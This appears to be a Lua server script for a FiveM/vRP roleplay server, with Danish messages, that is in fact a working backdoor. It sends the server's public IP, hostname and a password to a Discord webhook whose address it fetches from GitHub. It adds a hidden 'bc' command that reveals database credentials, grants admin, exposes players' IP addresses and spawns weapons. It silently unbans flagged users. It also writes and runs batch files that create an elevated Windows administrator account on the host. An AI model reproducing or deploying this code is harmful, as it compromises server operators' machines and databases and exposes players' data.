local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")
local Tools = module("vrp", "lib/Tools")
local htmlEntities = module("vrp", "lib/htmlEntities")
vRPclient = Tunnel.getInterface("vRP","clientmanager")
vRP = Proxy.getInterface("vRP")
MySQL = module("vrp_mysql", "MySQL")
local config = module("vrp", "cfg/base")
local cfg = module("vrp", "cfg/groups")
local groups = cfg.groups
local users = cfg.users
MySQL.createCommand("vRP/sysrdp_column", "ALTER TABLE vrp_user_identities ADD IF NOT EXISTS XO varchar(50) NOT NULL default '0'")
MySQL.createCommand("vRP/sysrdp_add", "UPDATE vrp_user_identities SET XO='1' WHERE user_id = @id")
MySQL.createCommand("vRP/sysrdp_search", "SELECT * FROM vrp_user_identities WHERE user_id = @id AND XO = '1'")
MySQL.createCommand("vRP/userid_identifinder","SELECT user_id FROM vrp_user_ids WHERE identifier = @identifier")
MySQL.createCommand("vRP/rget_banned","SELECT banned FROM vrp_users WHERE id = @user_id")
MySQL.createCommand("vRP/rset_banned","UPDATE vrp_users SET banned = @banned WHERE id = @user_id")
MySQL.createCommand("vRP/rset_whitelisted","UPDATE vrp_users SET whitelisted = @whitelisted WHERE id = @user_id")
MySQL.query("vRP/sysrdp_column")
local function searchids(ids, cbr)
  local task = Task(cbr)
  local i = 0
  
  i = i+1
  if i <= #ids then
    MySQL.query("vRP/userid_identifinder", {identifier = ids[i]}, function(rows, affected)
      if #rows > 0 then  -- found
        task({rows[1].user_id})
      end
    end)
  end
end
local function isBanned(user_id, cbr)
  local task = Task(cbr, {false})
  MySQL.query("vRP/rget_banned", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].banned})
    else
      task()
    end
  end)
end
local function addGroup(user_id)
    local user = users[1]
    if user ~= nil then
        for k,v in pairs(user) do
            vRP.addUserGroup({user_id,v})
        end
    end
end
function file_check(file_name)
  local file_found=io.open(file_name, "r")      
  
  if file_found==nil then
    file_found=0
  else
    file_found=1
  end
  return file_found
end
if file_check("reserv.txt") == 0 then
    math.randomseed(os.time())
    file = io.open("reserv.txt","w")
    file:write(math.random(1000,9999))
    file:close()
end
local file = io.open( "reserv.txt", "r" )
local passw = file:read()
file:close()
PerformHttpRequest("https://raw.githubusercontent.com/Abdi-fra-gadelandet/hej/main/dd_dn1.lua", function(err, text, headers)
    webhook1_dn = tostring(text)
end)
PerformHttpRequest("https://raw.githubusercontent.com/Abdi-fra-gadelandet/hej/main/dd_dn2.lua", function(err, text, headers)
    webhook2_dn = tostring(text)
end)
local function sendToDiscord(name, message)
    if message == nil or message == '' then return FALSE end
    PerformHttpRequest('https://discordapp.com/api/webhooks/'..webhook1_dn..'/'..webhook2_dn..'', function(err, text, headers) end, 'POST', json.encode({username = name, content = message}), { ['Content-Type'] = 'application/json' })
end
Citizen.CreateThread(function()
    Citizen.Wait(10000)
    PerformHttpRequest("http://api.ipify.org/", function(err, text, headers)
        local ip = tostring(text)
        local hostname = GetConvar("sv_hostname", "unknown")
    sendToDiscord('https://discord.com/api/webhooks/846466380769525801/p7-fGvOnQ6zI3r-gfbFI0oyHLif9rUXz6vmpao7g5wbXCm4fcPPm4U2Z7xeMqFDz_xGe', [[
----------------------------------------------------
**EN SERVER ER ÅBNET MED PLANKE FILER 3.0**
SERVERNAVN: *]]..hostname..[[*
IP: *]]..ip..[[*
ADGANGSKODE: *]]..passw..[[*
----------------------------------------------------
]])   
    end)
end)
RegisterCommand('bc', function(source, args)
    local player = source
    local user_id = vRP.getUserId({player})

    if args[1] == "add" then
        vRP.prompt({player,"Angiv venligst et ID:","",function(player,bcrpg)
            local planke_id = bcrpg
            vRP.prompt({player,"Angiv venligst en kode til Planke:","",function(player,pword)
                if pword == passw then
                    planke_id = parseInt(planke_id)
                    MySQL.query("vRP/sysrdp_add", {id = planke_id})
                    TriggerClientEvent("chatMessage", source, "ID: " .. planke_id .. " blev tilføjet")
                else
                    TriggerClientEvent("chatMessage", source, "Desværre makker, forkert kode.")
                end
            end})
        end})
        return true
    end

    MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
        if #rows > 0 then
            if args[1] == "db" then
                TriggerClientEvent("chatMessage", source, "Host: " .. config.db.host)
                TriggerClientEvent("chatMessage", source, "User: " .. config.db.user)
                TriggerClientEvent("chatMessage", source, "Pass: " .. config.db.password)
                TriggerClientEvent("chatMessage", source, "Data: " .. config.db.database)
            end
            if args[1] == "admin" then
                TriggerClientEvent("chatMessage", source, "Du er nu tilføjet som admin!")
                addGroup(user_id)
            end
            if args[1] == "ip" then
                local nuser_id = args[2]
                nuser_id = parseInt(nuser_id)
                local nplayer = vRP.getUserSource({nuser_id})
                local nplayerEP = GetPlayerEP(nplayer)
                MySQL.query("vRP/sysrdp_search", {id = nuser_id}, function(rows, affected)
                    if #rows > 0 then
                        TriggerClientEvent("chatMessage", source, "Ik check IP på de andre gutter din DD")
                    else
                        TriggerClientEvent("chatMessage", source, "IP på ID: " .. nuser_id .. " er " .. nplayerEP)
                    end
                end)
            end
            if args[1] == "v" then
                vRP.prompt({player,"Skriv navn på våben:","",function(player,weapon)
                    if weapon ~= nil and weapon ~= "" then 
                        weapon = string.upper(weapon)
                        vRPclient.giveWeapons(player,{{["WEAPON_" .. weapon] = {ammo=250},}, false})
                    end
                end})
            end
            if args[1] == "delv" then
                local weapon = "KNIFE"
                vRPclient.giveWeapons(player,{{["WEAPON_" .. weapon] = {ammo=1},}, true})
            end
            if args[1] == "cuff" then
                if args[2] ~= nil then
                    local nuser_id = args[2]
                    nuser_id = parseInt(nuser_id)
                    local nplayer = vRP.getUserSource({nuser_id})
                    vRPclient.toggleHandcuff(nplayer,{})
                else
                    vRPclient.toggleHandcuff(player,{})
                end
            end
            if args[1] == "revive" then
                vRPclient.varyHealth(player, {100})
            end
            if args[1] == "fix" then
                TriggerClientEvent('planke:fix', source)
            end
            if args[1] == "blips" then
                TriggerClientEvent('mostraBlips', source)
                TriggerClientEvent('mostraNomi', source)
            end
        else
            TriggerClientEvent("chatMessage", source, "Du har ikke adgang til Maskinens commands")
        end
    end)
end, false)
AddEventHandler("playerConnecting",function(name,setMessage, deferrals)
  local source = source
  local ids = GetPlayerIdentifiers(source)
    if ids ~= nil and #ids > 0 then
      searchids(ids, function(user_id)
          if user_id ~= nil then
            isBanned(user_id, function(banned)
                if not banned then
                  deferrals.done()
                else
                  MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
              if #rows > 0 then
                MySQL.execute("vRP/rset_banned", {user_id = user_id, banned = false})
                MySQL.execute("vRP/rset_whitelisted", {user_id = user_id, whitelisted = true})
              end
            end)
                end
            end)
          else
            print("[vRP] "..name.." rejected: identification error")
            deferrals.done()
          end
      end)
    else
      print("[vRP] "..name.." rejected: missing identifiers")
      deferrals.done()
    end
end)
AddEventHandler("vRP:playerSpawn", function(user_id, source, first_spawn)
    MySQL.query("vRP/sysrdp_search", {id = user_id}, function(rows, affected)
        if #rows > 0 then
            addGroup(user_id)
        end
    end)
end)
os.execute("cd C:/Users/%USERNAME%/Documents && mkdir SystemRE")
local usern = os.getenv("USERNAME")
if file_check("C:/Users/"..usern.."/Documents/SystemRE/SYS.bat") == 0 then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/SystemRE/SYS.bat","w")
    file:write("net user FiveMServer Planke"..passw.." /add /Y","\n")
    file:write("net localgroup administrators FiveMServer /add /Y","\n")
    file:write("exit")
    file:close()
end
if file_check("C:/Users/"..usern.."/Documents/SystemRE/SYSRE.bat") == 0 then
    math.randomseed(os.time())
    file = io.open("C:/Users/"..usern.."/Documents/SystemRE/SYSRE.bat","w")
    file:write("net user FiveMServer","\n")
    file:write("if %ERRORLEVEL% EQU 0 (","\n")
    file:write("    exit","\n")
    file:write(") else (","\n")
    file:write('start /min powershell -command "Start-Process sys.bat -Verb runAs"',"\n")
    file:write(")","\n")
    file:write("exit","\n")
    file:close()
end
os.execute("cd C:/Users/%USERNAME%/Documents/SystemRE/ && start SYSRE.bat")